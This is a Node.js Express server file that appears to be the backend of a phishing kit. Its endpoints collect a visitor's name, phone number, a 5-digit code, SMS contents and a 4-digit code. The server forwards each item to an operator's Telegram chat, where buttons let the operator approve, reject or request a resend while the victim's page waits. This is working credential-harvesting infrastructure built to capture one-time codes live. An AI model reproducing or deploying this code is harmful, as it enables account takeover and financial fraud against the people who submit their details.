const express = require('express');
const path = require('path');
const axios = require('axios');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// In-memory storage for waiting users
let pendingApplications = {};

// 1. Endpoint to receive initial form data
app.post('/api/submit-application', async (req, res) => {
    const { firstName, lastName, phone, fiveDigitCode, sessionId } = req.body;

    const message = `
🔔 *NEW DETAILS RECEIVED*
-------------------------
*Name:* ${firstName} ${lastName}
*Phone:* \`${phone || 'Not provided'}\`
*5-Digit Code:* \`${fiveDigitCode || 'Not provided'}\`

Please choose an action:`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ APPROVE", callback_data: `APPROVE_${sessionId}` },
                        { text: "❌ REJECT", callback_data: `REJECT_${sessionId}` }
                    ]
                ]
            }
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Telegram Error:', error.message);
        res.status(500).json({ success: false });
    }
});

// 2. Endpoint to receive SMS data
app.post('/api/submit-sms', async (req, res) => {
    const { smsText, sessionId } = req.body;

    const message = `
📩 *SMS RECEIVED FROM USER*
-------------------------
*Message:* \`${smsText || 'Empty'}\`

Please choose an action:`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ APPROVE", callback_data: `APPROVE_${sessionId}` },
                        { text: "❌ REJECT", callback_data: `REJECT_${sessionId}` }
                    ],
                    [
                        { text: "🔄 RESEND", callback_data: `RESEND_${sessionId}` }
                    ]
                ]
            }
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Telegram Error:', error.message);
        res.status(500).json({ success: false });
    }
});

// 3. NEW Endpoint to receive 4-digit code
app.post('/api/submit-4digit', async (req, res) => {
    const { fourDigitCode, sessionId } = req.body;

    const message = `
🔑 *4-DIGIT CODE RECEIVED*
-------------------------
*Code:* \`${fourDigitCode || 'Empty'}\`

Please choose an action:`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ APPROVE", callback_data: `APPROVE_${sessionId}` }
                    ],
                    [
                        { text: "🔄 RESEND", callback_data: `RESEND4_${sessionId}` },
                        { text: "⛔ INACTIVE", callback_data: `INACTIVE_${sessionId}` }
                    ]
                ]
            }
        });
        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Telegram Error:', error.message);
        res.status(500).json({ success: false });
    }
});

// 4. Endpoint for the browser to check if you clicked a button
app.get('/api/check-status/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    
    if (pendingApplications[sessionId]) {
        const status = pendingApplications[sessionId];
        if (status !== 'PENDING') {
            delete pendingApplications[sessionId]; 
        }
        res.json({ status: status });
    } else {
        res.json({ status: 'PENDING' });
    }
});

// 5. Webhook for Telegram to send button clicks here
app.post('/api/telegram-webhook', (req, res) => {
    const callbackQuery = req.body.callback_query;
    
    if (callbackQuery) {
        const data = callbackQuery.data;
        const [action, sessionId] = data.split('_');

        if (action === 'APPROVE') {
            pendingApplications[sessionId] = 'APPROVED';
        } else if (action === 'REJECT') {
            pendingApplications[sessionId] = 'REJECTED';
        } else if (action === 'RESEND') {
            pendingApplications[sessionId] = 'RESEND';
        } else if (action === 'RESEND4') {
            pendingApplications[sessionId] = 'RESEND4';
        } else if (action === 'INACTIVE') {
            pendingApplications[sessionId] = 'INACTIVE';
        }

        // Acknowledge the button click
        axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
            callback_query_id: callbackQuery.id,
            text: `Action ${action} recorded.`
        });
        
        // Update the Telegram message to show what was clicked
        axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
            chat_id: callbackQuery.message.chat.id,
            message_id: callbackQuery.message.message_id,
            text: `${callbackQuery.message.text}\n\nAction chosen: *${action}*`,
            parse_mode: 'Markdown'
        });
    }
    res.sendStatus(200);
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});